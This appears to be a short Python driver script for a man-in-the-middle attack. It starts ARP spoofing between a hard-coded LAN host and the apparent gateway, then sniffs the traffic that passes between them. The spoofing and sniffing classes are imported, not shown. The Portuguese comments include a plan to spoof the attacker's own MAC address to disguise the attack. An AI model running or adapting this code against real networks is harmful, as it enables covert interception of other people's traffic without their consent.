from ArpSpoofer import ArpSpoofer
from Sniffer import Sniffer
import threading
import time


# Ao apertar Ctrl+C, quem deve parar primeiro?
# Escrever pacotes forwardes no wireshark
# Spoofar meu mac para disfarçar ataque
def spoof_and_sniff(target_1_ip, target_2_ip):
    spoofer = ArpSpoofer(target_1_ip, target_2_ip)
    sniffer = Sniffer(target_1_ip, target_2_ip, write_to_pcap=False)

    print("Started Spoofing...")
    thr = threading.Thread(target=spoofer.attack, args=(), kwargs={})
    thr.start()
    time.sleep(2)

    print("Started Sniffing...")
    thr = threading.Thread(target=sniffer.sniff_packets, args=(), kwargs={})
    thr.start()


if __name__ == '__main__':
    spoof_and_sniff("192.168.0.22", "192.168.0.1")
